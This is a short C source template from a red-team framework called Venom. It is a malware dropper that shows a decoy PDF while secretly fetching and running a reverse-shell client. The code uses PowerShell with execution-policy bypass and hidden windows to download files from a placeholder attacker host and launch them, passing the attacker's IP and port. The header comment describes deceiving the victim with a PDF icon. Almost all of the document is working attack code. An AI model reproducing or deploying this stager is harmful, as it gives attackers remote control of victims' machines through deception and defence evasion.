/*
Author: r00t-3xp10it [SSA RedTeam @2020]
Framework: Venom v1.0.17 - Amsi Evasion Agent nº 5
This template its used to download/exec (Legit.pdf and Client.exe) from attacker machine (LAN)
and execute them in separated processes (hidden). Given the false sensation to target user that
he is opening an pdf document when in reality he is executing an binary.exe with one PDF Icon.
*/

#include<stdio.h>
#include<stdlib.h>
#include<winsock2.h>
#include<windows.h>

int main()
{
 /* Here we use powershell to download/execute the Legit pdf doc And the reverse tcp Client shell */
 system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.pdf', 'TempDir\\FiLNaMe.pdf') && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\FiLNaMe.pdf'");
 system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.exe', 'TempDir\\Client.exe') && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\Client.exe' -ArgumentList 'ip=LhOsT','port=LpOrT'");
 return 0;
}
